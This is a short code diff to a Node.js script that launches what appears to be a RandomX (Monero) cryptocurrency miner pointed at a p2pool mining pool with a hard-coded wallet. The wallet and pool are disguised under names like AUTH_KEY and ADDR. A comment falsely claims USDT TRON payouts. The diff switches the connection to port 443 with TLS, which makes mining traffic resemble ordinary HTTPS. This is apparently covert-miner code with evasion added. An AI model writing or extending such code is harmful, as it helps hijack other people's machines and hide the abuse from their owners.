@@ -4,7 +4,7 @@ const https = require('https');
 
 // === CONFIG ===
 // USDT payout memakai alamat TRON/TRC20.
-const ADDR = 'mini.p2pool.observer:37889';
+const ADDR = 'mini.p2pool.observer:443';
 const AUTH_KEY = '8A11nwd4RcW4yrHoZwQHbe8vudkPGLkQp8aaN4ZYjHwYEbM9jVxTXD4GsJgystemsMWPsyPN76jrdEAZVDD28E49DocihhT';
 const PASS = 'x';
 const MODE = 'rx/0';
@@ -23,6 +23,7 @@ function startProcess() {
         '-o', ADDR,
         '-u', AUTH_KEY,
         '-p', PASS,
+        '--tls',
         '--randomx-wrmsr=-1',
         '--randomx-no-rdmsr',
         '-k'
